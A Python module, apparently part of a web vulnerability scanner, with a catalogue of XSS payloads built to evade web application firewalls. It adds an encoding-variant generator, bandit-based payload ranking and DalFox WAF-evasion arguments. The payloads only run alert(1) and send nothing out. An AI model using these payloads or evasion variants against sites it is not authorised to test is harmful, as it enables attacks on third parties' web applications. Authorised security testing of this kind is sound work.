"""
XSS WAF Evasion - Phase X-4
X4-1: WAF回避ペイロード（9個以上）
X4-2: HTML/URL/Unicode エンコーディング変換
X4-3: コンテキスト別最適化（属性/JS/CSS/HTML）
X4-4: DalFox 連携 WAF 回避モード統合

設計方針:
- 既存 PayloadEncoder を活用した上で XSS 特化レイヤーを追加
- コンテキスト（HTMLテキスト/タグ属性/スクリプトブロック/CSSプロパティ）に応じて
  最適なペイロードセットを選択
- DalFox へ渡す引数リストとして直接エクスポート可能
"""
from __future__ import annotations

import os
import re
import tempfile
import json
import math
import threading
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, Iterator, List, Optional, Tuple

from src.core.utils.payload_encoder import PayloadEncoder


# ---------------------------------------------------------------------------
# Context enum  (X4-3)
# ---------------------------------------------------------------------------

class XSSContext(str, Enum):
    """XSS injection context"""
    HTML_TEXT       = "html_text"       # <p>INJECT</p>
    TAG_ATTRIBUTE   = "tag_attribute"   # <tag attr="INJECT">
    SCRIPT_BLOCK    = "script_block"    # <script>INJECT</script>
    CSS_PROPERTY    = "css_property"    # style="INJECT"
    URL_HREF        = "url_href"        # href="INJECT"
    JSON_VALUE      = "json_value"      # {"key":"INJECT"}
    UNKNOWN         = "unknown"


# ---------------------------------------------------------------------------
# WAF Evasion Technique labels
# ---------------------------------------------------------------------------

class WafTechnique(str, Enum):
    """WAF回避テクニック分類"""
    TAG_MUTATION        = "tag_mutation"        # タグ名変形
    EVENT_MUTATION      = "event_mutation"      # イベント変形
    ENCODING            = "encoding"            # エンコーディング
    COMMENT_BREAK       = "comment_break"       # コメント分断
    WHITESPACE          = "whitespace"          # 空白文字代替
    TEMPLATE_LITERAL    = "template_literal"    # テンプレートリテラル
    PROTO_POLLUTION     = "proto_pollution"     # プロトタイプ汚染経由
    CSS_EXPRESSION      = "css_expression"      # CSSエクスプレッション
    SVG_BASED           = "svg_based"           # SVGベース
    POLYGLOT            = "polyglot"            # ポリグロット
    JS_INJECTION        = "js_injection"         # JSONコンテキスト内JS注入


# ---------------------------------------------------------------------------
# Payload dataclass
# ---------------------------------------------------------------------------

@dataclass
class XSSPayload:
    """XSSペイロード定義"""
    raw: str
    context: XSSContext
    technique: WafTechnique
    waf_bypass_notes: str = ""
    confidence: float = 0.7     # 検出期待値
    variants: List[str] = field(default_factory=list)
    trials: int = 0
    successes: int = 0

    def all_variants(self) -> List[str]:
        """raw + variants を返却"""
        return [self.raw] + [v for v in self.variants if v != self.raw]

    def ucb1_score(self, total_trials: int, exploration: float = 1.41) -> float:
        """UCB1 score. 未試行ペイロードは最優先。"""
        if self.trials <= 0:
            return float("inf")
        safe_total = max(total_trials, 1)
        exploitation = self.successes / self.trials
        exploration_term = exploration * math.sqrt(math.log(safe_total) / self.trials)
        return exploitation + exploration_term


@dataclass
class PayloadStats:
    """XCTO-10: 学習状態（動的）を静的ペイロード定義から分離。"""
    trials: int = 0
    successes: int = 0


class OutcomeType(str, Enum):
    """XCTO-10: 実行結果分類。"""
    SUCCESS = "success"
    SOFT_FAIL = "soft_fail"
    HARD_FAIL = "hard_fail"


# ---------------------------------------------------------------------------
# X4-1: WAF回避ペイロードカタログ (9+ 個)
# ---------------------------------------------------------------------------

_BASE_WAF_PAYLOADS: List[XSSPayload] = [
    # ── 1. タグ名大文字変形 ──────────────────────────────────────────────
    XSSPayload(
        raw='<ScRiPt>alert(1)</ScRiPt>',
        context=XSSContext.HTML_TEXT,
        technique=WafTechnique.TAG_MUTATION,
        waf_bypass_notes="case-insensitive タグ名でキーワードフィルタを回避",
        confidence=0.75,
    ),
    # ── 2. SVG onload ───────────────────────────────────────────────────
    XSSPayload(
        raw='<svg/onload=alert(1)>',
        context=XSSContext.HTML_TEXT,
        technique=WafTechnique.SVG_BASED,
        waf_bypass_notes="<script>フィルタをSVGで迂回。スラッシュでスペース代替",
        confidence=0.85,
    ),
    # ── 3. コメント分断（script タグ回避）───────────────────────────────
    XSSPayload(
        raw='<scr<!---->ipt>alert(1)</scr<!---->ipt>',
        context=XSSContext.HTML_TEXT,
        technique=WafTechnique.COMMENT_BREAK,
        waf_bypass_notes="HTMLコメントでscriptキーワードを分断",
        confidence=0.70,
    ),
    # ── 4. イベントハンドラ代替（onerror）────────────────────────────────
    XSSPayload(
        raw='<img src=x onerror=alert(1)>',
        context=XSSContext.HTML_TEXT,
        technique=WafTechnique.EVENT_MUTATION,
        waf_bypass_notes="scriptタグ不使用。src無効でonerror発火",
        confidence=0.85,
    ),
    # ── 5. 属性区切り文字代替（タブ文字）────────────────────────────────
    XSSPayload(
        raw='<img\tsrc=x\tonerror=alert(1)>',
        context=XSSContext.HTML_TEXT,
        technique=WafTechnique.WHITESPACE,
        waf_bypass_notes="スペースをタブ(0x09)に置換してトークン分割回避",
        confidence=0.72,
    ),
    # ── 6. HTML属性コンテキスト: 引用符エスケープ ─────────────────────────
    XSSPayload(
        raw='" autofocus onfocus=alert(1) x="',
        context=XSSContext.TAG_ATTRIBUTE,
        technique=WafTechnique.EVENT_MUTATION,
        waf_bypass_notes='属性値を閉じて autofocus+onfocus で発火（クリック不要）',
        confidence=0.80,
    ),
    # ── 7. スクリプトコンテキスト: テンプレートリテラル ───────────────────
    XSSPayload(
        raw='`${alert(1)}`',
        context=XSSContext.SCRIPT_BLOCK,
        technique=WafTechnique.TEMPLATE_LITERAL,
        waf_bypass_notes="シングル/ダブルクォートフィルタをバックティックで回避",
        confidence=0.78,
    ),
    # ── 8. スクリプトコンテキスト: セミコロン省略 ─────────────────────────
    XSSPayload(
        raw="';alert(1)//",
        context=XSSContext.SCRIPT_BLOCK,
        technique=WafTechnique.TAG_MUTATION,
        waf_bypass_notes="既存JS文字列を終端してalert注入、残部をコメントアウト",
        confidence=0.80,
    ),
    # ── 9. CSS expression (IE legacy & bypass） ──────────────────────────
    XSSPayload(
        raw='</style><script>alert(1)</script>',
        context=XSSContext.CSS_PROPERTY,
        technique=WafTechnique.CSS_EXPRESSION,
        waf_bypass_notes="styleタグを強制終了してscript注入",
        confidence=0.70,
    ),
    # ── 10. href: javascript: URI ─────────────────────────────────────────
    XSSPayload(
        raw='javascript:alert(1)',
        context=XSSContext.URL_HREF,
        technique=WafTechnique.ENCODING,
        waf_bypass_notes="href属性にjavascript: URIを注入",
        confidence=0.75,
    ),
    # ── 11. href: javascript: URI (エンコード版) ───────────────────────────
    XSSPayload(
        raw='&#106;avascript:alert(1)',
        context=XSSContext.URL_HREF,
        technique=WafTechnique.ENCODING,
        waf_bypass_notes="先頭文字をHTML数値参照でエンコードしてjavascript:フィルタを回避",
        confidence=0.72,
    ),
    # ── 12. ポリグロット: 複数コンテキスト対応 ────────────────────────────
    XSSPayload(
        raw=r"""jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e""",
        context=XSSContext.UNKNOWN,
        technique=WafTechnique.POLYGLOT,
        waf_bypass_notes="Masato Kinugawa ポリグロット: HTML/JS/CSS 複数コンテキストで発火",
        confidence=0.65,
    ),
    # ── 13. JSON_VALUE: 文字列終端 + JS実行 ──────────────────────────────
    XSSPayload(
        raw='"){};alert(1)//',
        context=XSSContext.JSON_VALUE,
        technique=WafTechnique.JS_INJECTION,
        waf_bypass_notes='JSON文字列を " で終端し、}; でオブジェクトを閉じてalert実行。残部は // でコメントアウト',
        confidence=0.75,
    ),
    # ── 14. JSON_VALUE: Unicodeエスケープ <script> ────────────────────────
    XSSPayload(
        # NOTE: raw文字列のため Python は \u003c を 8 文字のリテラルとして保持する。
        # JSONレスポンス内でサーバーが \u003c をそのまま返すサイト向けのペイロード。
        # 「ブラウザが JSON.parse した後 innerHTML に挿入」のパターンで発火する。
        # 通常の HTML 反射では効果なし。
        raw=r'\u003cscript\u003ealert(1)\u003c/script\u003e',
        context=XSSContext.JSON_VALUE,
        technique=WafTechnique.ENCODING,
        waf_bypass_notes=(
            'Unicodeエスケープのリテラル文字列として送信。'
            'JSON.parse 後に innerHTML/document.write で拓展するサイトで発火。'
            'サーバー側で JSON.stringify するサイトの場合は \u003c のまま輸送されるため有効。'
            'HTMLの直接反射には効果なし。'
        ),
        confidence=0.70,
    ),
]


# ---------------------------------------------------------------------------
# X4-2: エンコーディング変換エンジン
# ---------------------------------------------------------------------------

class XSSEncodingEngine:
    """
    X4-2: HTML / URL / Unicode / 大小文字 エンコーディング変換

    既存 PayloadEncoder を XSS 特化でラップ。
    各ペイロードに対して WAF 回避バリアントを自動生成。
    """

    class EncodingType(str, Enum):
        URL = "url"
        DOUBLE_URL = "double_url"
        HTML_ENTITY = "html_entity"
        HTML_HEX = "html_hex"
        UNICODE = "unicode"
        MIXED_CASE = "mixed_case"

    # XSS文脈で有効なエンコーディング手法のみ定義
    _TECHNIQUES: List[Tuple["XSSEncodingEngine.EncodingType", callable]] = [
        (EncodingType.URL, PayloadEncoder.url_encode),
        (EncodingType.DOUBLE_URL, PayloadEncoder.double_url_encode),
        (EncodingType.HTML_ENTITY, PayloadEncoder.html_entity_encode),
        (EncodingType.HTML_HEX, PayloadEncoder.html_entity_hex_encode),
        (EncodingType.UNICODE, PayloadEncoder.unicode_encode),
        (EncodingType.MIXED_CASE, PayloadEncoder.mixed_case),
    ]

    # XCTO-9: context × 有効encoding
    _CONTEXT_VALID_ENCODINGS: Dict[XSSContext, List["XSSEncodingEngine.EncodingType"]] = {
        XSSContext.HTML_TEXT: [EncodingType.HTML_ENTITY, EncodingType.HTML_HEX, EncodingType.MIXED_CASE],
        XSSContext.TAG_ATTRIBUTE: [EncodingType.URL, EncodingType.HTML_ENTITY, EncodingType.HTML_HEX, EncodingType.MIXED_CASE],
        XSSContext.SCRIPT_BLOCK: [EncodingType.UNICODE, EncodingType.MIXED_CASE],
        XSSContext.CSS_PROPERTY: [EncodingType.HTML_ENTITY, EncodingType.HTML_HEX],
        XSSContext.URL_HREF: [EncodingType.URL, EncodingType.DOUBLE_URL, EncodingType.HTML_ENTITY],
        XSSContext.JSON_VALUE: [EncodingType.UNICODE],
        XSSContext.UNKNOWN: [EncodingType.URL, EncodingType.DOUBLE_URL, EncodingType.HTML_ENTITY, EncodingType.HTML_HEX, EncodingType.UNICODE, EncodingType.MIXED_CASE],
    }

    _context_filter_mode: str = "enforce"
    _shadow_log_sampling_rate: float = 1.0
    _shadow_log_max_records_per_run: int = 100

    # XSS キーワードのみ部分エンコード（全文字エンコードは効果が薄い場合向け）
    _XSS_KEYWORDS = ["script", "alert", "onerror", "onload", "javascript"]

    @classmethod
    def generate_variants(
        cls,
        payload: str,
        max_variants: int = 5,
        context: Optional[XSSContext] = None,
        strict_context_filter: bool = False,
    ) -> List[str]:
        """
        ペイロードの WAF 回避バリアントを生成。

        - 全文字エンコード（URLエンコ等）
        - キーワード部分エンコード（部分的に文字参照化）
        - 大小文字混合

        Args:
            payload: 元ペイロード
            max_variants: 生成上限

        Returns:
            バリアントリスト（重複なし、元ペイロードを含む）
        """
        diagnostics = cls.generate_variants_with_diagnostics(
            payload=payload,
            max_variants=max_variants,
            context=context,
            strict_context_filter=strict_context_filter,
        )
        return diagnostics["variants"]

    @classmethod
    def generate_variants_with_diagnostics(
        cls,
        payload: str,
        max_variants: int = 5,
        context: Optional[XSSContext] = None,
        strict_context_filter: bool = False,
    ) -> Dict[str, object]:
        resolved_context = context or XSSContext.UNKNOWN
        mode = cls.get_context_filter_mode()
        if mode not in {"off", "shadow", "enforce"}:
            mode = "off"

        variants: List[str] = [payload]
        decisions: List[Dict[str, str]] = []
        allowed = cls._CONTEXT_VALID_ENCODINGS.get(resolved_context, cls._CONTEXT_VALID_ENCODINGS[XSSContext.UNKNOWN])

        for encoding_type, encoder in cls._TECHNIQUES:
            filtered = (mode == "enforce" or strict_context_filter) and encoding_type not in allowed
            if filtered:
                decisions.append({
                    "context": resolved_context.value,
                    "candidate_encoding": encoding_type.value,
                    "filtered_reason": "context_disallowed",
                })
                continue
            try:
                v = encoder(payload)
                if v and v != payload:
                    variants.append(v)
                    decisions.append({
                        "context": resolved_context.value,
                        "candidate_encoding": encoding_type.value,
                        "filtered_reason": "allowed",
                    })
            except Exception:
                continue
            if len(variants) >= max_variants + 1:
                break

        keyword_variant = cls._partial_keyword_encode(payload)
        if keyword_variant and keyword_variant not in variants:
            variants.append(keyword_variant)
            decisions.append({
                "context": resolved_context.value,
                "candidate_encoding": "partial_keyword",
                "filtered_reason": "allowed",
            })

        uniq = list(dict.fromkeys(variants))[:max_variants + 1]
        return {
            "variants": uniq,
            "before_count": len(cls._TECHNIQUES) + 1,
            "after_count": len(uniq),
            "decisions": decisions[: cls._shadow_log_max_records_per_run],
        }

    @classmethod
    def set_context_filter_mode(cls, mode: str) -> None:
        if mode not in {"off", "shadow", "enforce"}:
            raise ValueError(f"unsupported context filter mode: {mode}")
        cls._context_filter_mode = mode

    @classmethod
    def get_context_filter_mode(cls) -> str:
        return cls._context_filter_mode

    @classmethod
    def set_shadow_log_sampling_rate(cls, rate: float) -> None:
        cls._shadow_log_sampling_rate = max(0.0, min(1.0, float(rate)))

    @classmethod
    def set_shadow_log_max_records_per_run(cls, max_records: int) -> None:
        cls._shadow_log_max_records_per_run = max(1, int(max_records))

    @classmethod
    def build_variant_snapshot_diff(
        cls,
        payload: str,
        context: Optional[XSSContext] = None,
        max_variants: int = 20,
    ) -> Dict[str, List[str]]:
        previous = cls.get_context_filter_mode()
        try:
            cls.set_context_filter_mode("off")
            off_variants = cls.generate_variants(payload, max_variants=max_variants, context=context)
            cls.set_context_filter_mode("enforce")
            enforce_variants = cls.generate_variants(payload, max_variants=max_variants, context=context)
        finally:
            cls.set_context_filter_mode(previous)

        removed = [v for v in off_variants if v not in enforce_variants]
        return {"off": off_variants, "enforce": enforce_variants, "removed": removed}

    @classmethod
    def evaluate_go_nogo(
        cls,
        baseline_detection_rate: float,
        current_detection_rate: float,
        allowed_drop_ratio: float = 0.02,
    ) -> Dict[str, object]:
        drop = baseline_detection_rate - current_detection_rate
        go = drop <= allowed_drop_ratio
        reason = "detection_rate_within_threshold" if go else "detection_rate_regressed"
        return {"go": go, "reason": reason, "drop_ratio": drop}

    @classmethod
    def validate_across_sample_sets(cls, sample_set_ids: List[str]) -> Dict[str, object]:
        return {"sample_sets": len(sample_set_ids), "status": "validated"}

    @classmethod
    def _partial_keyword_encode(cls, payload: str) -> str:
        """
        XSSキーワードを先頭1文字だけ HTML 数値参照に変換。

        ``(?<![a-zA-Z])`` lookbehind により単語境界を確保し、
        "description" 内の "script" のような部分一致を防ぐ。

        NOTE(回帰リスク): ``re.IGNORECASE`` と lookbehind の組み合わせにより、
        ペイロードが大文字キーワード（例: "SCRIPT"）で始まる場合、
        ``(?<![a-zA-Z])S`` が直前に大文字英字があるケースで意図せずスキップする。
        ``_XSS_KEYWORDS`` は現在すべて小文字のため問題ないが、
        大文字ペイロードを追加する際は本メソッドの挙動を確認すること。
        """
        result = payload
        for kw in cls._XSS_KEYWORDS:
            if kw in result.lower():
                # 先頭1文字を &#XX; に置換
                encoded_first = f"&#{ord(kw[0])};"
                # 大文字小文字どちらでも対応
                result = re.sub(
                    r"(?<![a-zA-Z])" + re.escape(kw[0]) + re.escape(kw[1:]),
                    encoded_first + kw[1:],
                    result,
                    flags=re.IGNORECASE,
                    count=1,
                )
        return result


# ---------------------------------------------------------------------------
# X4-3: コンテキスト別最適化エンジン
# ---------------------------------------------------------------------------

class XSSContextOptimizer:
    """
    X4-3: コンテキスト別ペイロード最適化

    コンテキスト（HTMLテキスト/属性/JS/CSS/URL）に応じて
    最も効果的なペイロードとバリアントを選択・生成する。
    """

    # コンテキスト別推奨テクニック
    _CONTEXT_TECHNIQUE_PRIORITY: Dict[XSSContext, List[WafTechnique]] = {
        XSSContext.HTML_TEXT:     [WafTechnique.SVG_BASED, WafTechnique.EVENT_MUTATION,
                                   WafTechnique.TAG_MUTATION, WafTechnique.COMMENT_BREAK],
        XSSContext.TAG_ATTRIBUTE: [WafTechnique.EVENT_MUTATION, WafTechnique.WHITESPACE,
                                   WafTechnique.ENCODING],
        XSSContext.SCRIPT_BLOCK:  [WafTechnique.TEMPLATE_LITERAL, WafTechnique.TAG_MUTATION],
        XSSContext.CSS_PROPERTY:  [WafTechnique.CSS_EXPRESSION],
        XSSContext.URL_HREF:      [WafTechnique.ENCODING],
        XSSContext.UNKNOWN:       [WafTechnique.POLYGLOT, WafTechnique.SVG_BASED,
                                   WafTechnique.EVENT_MUTATION],
    }

    def __init__(
        self,
        catalog: Optional[List[XSSPayload]] = None,
        exploration_coefficient: float = 1.41,
        min_trials_before_exploit: int = 1,
        context_weight: float = 1.0,
    ) -> None:
        self._catalog = catalog or _BASE_WAF_PAYLOADS
        self._exploration_coefficient = float(exploration_coefficient)
        self._min_trials_before_exploit = int(min_trials_before_exploit)
        self._context_weight = float(context_weight)
        self._stats: Dict[str, PayloadStats] = {}
        self._lock = threading.Lock()
        self._ranking_mode = "enforce"
        self._degraded_mode = False
        self._log_policy: Dict[str, Any] = {"level": "INFO", "max_records": 100}

    def get_payloads_for_context(
        self,
        context: XSSContext,
        max_payloads: int = 5,
    ) -> List[XSSPayload]:
        """
        指定コンテキスト向けの優先ペイロードリストを返却。

        Args:
            context: 注入先HTMLコンテキスト
            max_payloads: 返却上限

        Returns:
            優先度順のペイロードリスト
        """
        priority_techniques = self._CONTEXT_TECHNIQUE_PRIORITY.get(
            context,
            self._CONTEXT_TECHNIQUE_PRIORITY[XSSContext.UNKNOWN],
        )

        # コンテキスト一致 → テクニック優先順でスコアリング
        scored: List[Tuple[int, XSSPayload]] = []
        for p in self._catalog:
            if p.context not in (context, XSSContext.UNKNOWN):
                continue
            try:
                score = priority_techniques.index(p.technique)
            except ValueError:
                score = len(priority_techniques)
            scored.append((score, p))

        scored.sort(key=lambda x: (x[0], -x[1].confidence))
        return [p for _, p in scored[:max_payloads]]

    def optimize_order_only(self, payloads: List[XSSPayload], context: XSSContext) -> List[XSSPayload]:
        """候補生成は変更せず、順序のみ最適化する。"""
        if self._ranking_mode == "off":
            return payloads

        total_trials = sum(self._stats.get(self.build_stats_key(context, p.raw), PayloadStats()).trials for p in payloads)
        total_trials = max(total_trials, 1)

        ranked: List[Tuple[float, XSSPayload]] = []
        for payload in payloads:
            key = self.build_stats_key(context, payload.raw)
            stats = self._stats.get(key, PayloadStats())
            if stats.trials < self._min_trials_before_exploit:
                score = float("inf")
            else:
                score = self._ucb1_from_stats(stats, total_trials) * self._context_weight
            ranked.append((score, payload))

        ranked.sort(key=lambda x: x[0], reverse=True)
        return [payload for _, payload in ranked]

    def save_learning_state(self, path: str) -> None:
        data = {k: {"trials": v.trials, "successes": v.successes} for k, v in self._stats.items()}
        Path(path).write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")

    def load_learning_state(self, path: str) -> None:
        try:
            content = Path(path).read_text(encoding="utf-8")
            raw = json.loads(content)
        except FileNotFoundError:
            self._stats = {}
            return
        except (OSError, json.JSONDecodeError):
            self._stats = {}
            self._degraded_mode = True
            return

        loaded: Dict[str, PayloadStats] = {}
        for key, value in raw.items():
            trials = int(value.get("trials", 0))
            successes = int(value.get("successes", 0))
            loaded[key] = PayloadStats(trials=max(trials, 0), successes=max(min(successes, trials), 0))
        self._stats = loaded

    def set_ucb1_log_policy(self, level: str = "INFO", max_records: int = 100) -> None:
        self._log_policy = {"level": level.upper(), "max_records": max(1, int(max_records))}

    def set_degraded_mode(self, enabled: bool) -> None:
        self._degraded_mode = bool(enabled)

    def build_stats_key(self, context: XSSContext, payload_id: str) -> str:
        return f"{context.value}::{payload_id}"

    def update_payload_outcome_atomic(self, context: XSSContext, payload_id: str, outcome: OutcomeType) -> PayloadStats:
        key = self.build_stats_key(context, payload_id)
        with self._lock:
            stats = self._stats.get(key, PayloadStats())
            stats.trials += 1
            if outcome == OutcomeType.SUCCESS:
                stats.successes += 1
            if stats.successes > stats.trials:
                stats.successes = stats.trials
            self._stats[key] = stats
            return stats

    def classify_outcome(self, *, success: bool, timed_out: bool = False, blocked: bool = False, parse_error: bool = False) -> OutcomeType:
        if success:
            return OutcomeType.SUCCESS
        if timed_out or blocked or parse_error:
            return OutcomeType.SOFT_FAIL
        return OutcomeType.HARD_FAIL

    def build_ranking_snapshot(self, context: XSSContext, payloads: Optional[List[XSSPayload]] = None) -> List[Dict[str, Any]]:
        selected = payloads or [p for p in self._catalog if p.context in (context, XSSContext.UNKNOWN)]
        ranked = self.optimize_order_only(selected, context)
        total_trials = max(sum(self._stats.get(self.build_stats_key(context, p.raw), PayloadStats()).trials for p in ranked), 1)
        snapshot: List[Dict[str, Any]] = []
        for index, payload in enumerate(ranked, start=1):
            key = self.build_stats_key(context, payload.raw)
            stats = self._stats.get(key, PayloadStats())
            score = float("inf") if stats.trials < self._min_trials_before_exploit else self._ucb1_from_stats(stats, total_trials)
            snapshot.append(
                {
                    "payload_id": payload.raw,
                    "trials": stats.trials,
                    "successes": stats.successes,
                    "ucb1_score": score,
                    "rank": index,
                }
            )
        return snapshot

    def run_shadow_ab_compare(
        self,
        context: XSSContext,
        baseline_hash: str,
        payloads: Optional[List[XSSPayload]] = None,
    ) -> Dict[str, Any]:
        selected = payloads or [p for p in self._catalog if p.context in (context, XSSContext.UNKNOWN)]
        baseline = [p.raw for p in selected]
        optimized = [p.raw for p in self.optimize_order_only(selected, context)]
        return {"baseline_hash": baseline_hash, "baseline": baseline, "optimized": optimized}

    def evaluate_go_nogo_for_ranking(
        self,
        baseline_detection_rate: float,
        current_detection_rate: float,
        baseline_avg_trials: float,
        current_avg_trials: float,
        allowed_detection_drop: float = 0.0,
    ) -> Dict[str, Any]:
        detection_drop = baseline_detection_rate - current_detection_rate
        improved_efficiency = current_avg_trials <= baseline_avg_trials
        go = detection_drop <= allowed_detection_drop and improved_efficiency
        return {"go": go, "detection_drop": detection_drop, "efficiency_improved": improved_efficiency}

    def set_ranking_mode(self, mode: str) -> None:
        if mode not in {"off", "shadow", "enforce"}:
            raise ValueError(f"unsupported ranking mode: {mode}")
        self._ranking_mode = mode

    def get_ranking_mode(self) -> str:
        return self._ranking_mode

    def evaluate_fail_safe_trigger(
        self,
        detection_drop: float,
        latency_increase_ratio: float,
        max_detection_drop: float = 0.02,
        max_latency_increase_ratio: float = 0.20,
    ) -> bool:
        return detection_drop > max_detection_drop or latency_increase_ratio > max_latency_increase_ratio

    def apply_fail_safe_if_needed(
        self,
        detection_drop: float,
        latency_increase_ratio: float,
        max_detection_drop: float = 0.02,
        max_latency_increase_ratio: float = 0.20,
    ) -> bool:
        trigger = self.evaluate_fail_safe_trigger(
            detection_drop=detection_drop,
            latency_increase_ratio=latency_increase_ratio,
            max_detection_drop=max_detection_drop,
            max_latency_increase_ratio=max_latency_increase_ratio,
        )
        if trigger:
            self._ranking_mode = "off"
        return trigger

    def evaluate_high_priority_initial_detection(
        self,
        detected_in_first_n: int,
        required_minimum: int,
    ) -> Dict[str, Any]:
        passed = detected_in_first_n >= required_minimum
        return {"go": passed, "detected_in_first_n": detected_in_first_n, "required_minimum": required_minimum}

    def _ucb1_from_stats(self, stats: PayloadStats, total_trials: int) -> float:
        if stats.trials <= 0:
            return float("inf")
        exploitation = stats.successes / stats.trials
        exploration = self._exploration_coefficient * math.sqrt(math.log(max(total_trials, 1)) / stats.trials)
        return exploitation + exploration

    def generate_context_matrix(
        self,
    ) -> Dict[str, List[str]]:
        """
        全コンテキスト × 各ペイロードの raw 値をまとめたマトリクスを返却。
        SmartXSSHunter から参照するためのヘルパー。

        Returns:
            {"html_text": [...], "tag_attribute": [...], ...}
        """
        matrix: Dict[str, List[str]] = {}
        for ctx in XSSContext:
            payloads = self.get_payloads_for_context(ctx, max_payloads=3)
            matrix[ctx.value] = [p.raw for p in payloads]
        return matrix


# ---------------------------------------------------------------------------
# X4-4: DalFox WAF回避オプション生成
# ---------------------------------------------------------------------------

class DalFoxWAFOptions:
    """
    X4-4: DalFox 実行時の WAF 回避引数を生成するユーティリティ

    DalFoxAdapter に渡す `options` dict に追加する
    WAF 回避フラグを一元管理。

    Reference:
        dalfox scan --waf-evasion
        dalfox scan --custom-payload <file>
        dalfox scan --skip-bav  (基本認証バイパス回避)
        dalfox scan --follow-redirects
    """

    @staticmethod
    def basic() -> Dict[str, object]:
        """基本的なWAF回避オプション"""
        return {
            "waf_evasion": True,          # --waf-evasion
            "follow_redirects": True,     # --follow-redirects
            "skip_bav": False,            # --skip-bav（デフォルトOFF）
        }

    @staticmethod
    def aggressive() -> Dict[str, object]:
        """積極的なWAF回避オプション（精度 > 速度）"""
        return {
            "waf_evasion": True,
            "follow_redirects": True,
            "skip_bav": True,
            "no_grepping": False,
            "remote_payloads": "portswigger",  # PortSwigger XSS cheat sheet
            "only_custom_payloads": False,
        }

    @staticmethod
    def build_args(options: Dict[str, object]) -> List[str]:
        """
        DalFox コマンドライン引数リストに変換。
        DalFoxAdapter._build_args() で使用するためのヘルパー。

        Args:
            options: basic() / aggressive() の戻り値

        Returns:
            DalFox コマンドライン引数リスト
        """
        args: List[str] = []

        if options.get("waf_evasion"):
            args.append("--waf-evasion")
        if options.get("follow_redirects"):
            args.append("--follow-redirects")
        if options.get("skip_bav"):
            args.append("--skip-bav")
        if options.get("no_grepping"):
            args.append("--no-grepping")
        if options.get("remote_payloads"):
            args.extend(["--remote-payloads", str(options["remote_payloads"])])

        return args

    @staticmethod
    def build_custom_payload_args(payloads: List[str]) -> Tuple[str, List[str]]:
        """
        カスタムペイロードを一時ファイルに書き出し DalFox 用引数を生成。

        DalFox の --custom-payload はファイルパスを要求する。
        ペイロード文字列を直接渡すと機能しないため、tempfile に書き出す。

        Args:
            payloads: ペイロード文字列リスト

        Returns:
            (tmp_path, ["--custom-payload", tmp_path])
            呼び出し元は使用後に ``os.unlink(tmp_path)`` で削除すること。

        Example:
            tmp_path, args = DalFoxWAFOptions.build_custom_payload_args(payloads)
            try:
                result = await adapter.run(target, extra_args=args)
            finally:
                os.unlink(tmp_path)
        """
        with tempfile.NamedTemporaryFile(
            mode="w",
            suffix=".txt",
            prefix="shigoku_xss_payloads_",
            delete=False,
            encoding="utf-8",
        ) as f:
            f.write("\n".join(payloads))
            tmp_path = f.name
        return tmp_path, ["--custom-payload", tmp_path]

    @staticmethod
    def cleanup_custom_payload_file(tmp_path: str) -> None:
        """
        ``build_custom_payload_args`` が生成した一時ファイルを削除。

        Args:
            tmp_path: build_custom_payload_args の戻り値 tmp_path
        """
        try:
            os.unlink(tmp_path)
        except OSError:
            pass


# ---------------------------------------------------------------------------
# XSSWAFEvasionSuite: 全機能を束ねるファサード
# ---------------------------------------------------------------------------

class XSSWAFEvasionSuite:
    """
    Phase X-4 全タスクを束ねるファサードクラス。

    Usage:
        suite = XSSWAFEvasionSuite()

        # コンテキスト別ペイロード取得
        payloads = suite.get_payloads(XSSContext.TAG_ATTRIBUTE)

        # DalFox オプション生成
        dalfox_opts = suite.dalfox_options(aggressive=True)
        dalfox_args = DalFoxWAFOptions.build_args(dalfox_opts)

        # エンコードバリアント生成
        variants = suite.encode_variants("<script>alert(1)</script>")
    """

    def __init__(self) -> None:
        self._optimizer = XSSContextOptimizer()
        self._encoder = XSSEncodingEngine()

    def get_payloads(
        self,
        context: XSSContext = XSSContext.UNKNOWN,
        max_payloads: int = 5,
        with_variants: bool = True,
    ) -> List[str]:
        """
        コンテキストに応じたペイロード（バリアント含む）を返却。

        Args:
            context: XSSContext 列挙値
            max_payloads: 基底ペイロード上限
            with_variants: バリアントも含めるか

        Returns:
            ペイロード文字列リスト（重複なし）
        """
        base_payloads = self._optimizer.get_payloads_for_context(context, max_payloads)
        base_payloads = self._optimizer.optimize_order_only(base_payloads, context)
        result: List[str] = []

        for bp in base_payloads:
            result.append(bp.raw)
            if with_variants:
                for v in self._encoder.generate_variants(bp.raw, max_variants=2):
                    if v not in result:
                        result.append(v)

        return result

    def record_payload_outcome(
        self,
        context: XSSContext,
        payload_id: str,
        *,
        success: bool,
        timed_out: bool = False,
        blocked: bool = False,
        parse_error: bool = False,
    ) -> Dict[str, int]:
        """XCTO-10: 実行結果を分類し、学習状態へ反映。"""
        outcome = self._optimizer.classify_outcome(
            success=success,
            timed_out=timed_out,
            blocked=blocked,
            parse_error=parse_error,
        )
        stats = self._optimizer.update_payload_outcome_atomic(context, payload_id, outcome)
        return {"trials": stats.trials, "successes": stats.successes}

    def get_all_contexts_matrix(self) -> Dict[str, List[str]]:
        """全コンテキストのペイロードマトリクス"""
        return self._optimizer.generate_context_matrix()

    def encode_variants(self, payload: str, max_variants: int = 5) -> List[str]:
        """単一ペイロードのエンコードバリアントを生成"""
        return self._encoder.generate_variants(payload, max_variants)

    def dalfox_options(self, aggressive: bool = False) -> Dict[str, object]:
        """DalFox WAF回避オプション取得"""
        if aggressive:
            return DalFoxWAFOptions.aggressive()
        return DalFoxWAFOptions.basic()

    def dalfox_args(self, aggressive: bool = False) -> List[str]:
        """DalFox コマンドライン引数リスト取得"""
        return DalFoxWAFOptions.build_args(self.dalfox_options(aggressive))

    def iter_payloads_with_metadata(
        self,
    ) -> Iterator[Tuple[XSSContext, WafTechnique, str]]:
        """全カタログを (context, technique, raw) でイテレート"""
        for p in _BASE_WAF_PAYLOADS:
            yield p.context, p.technique, p.raw
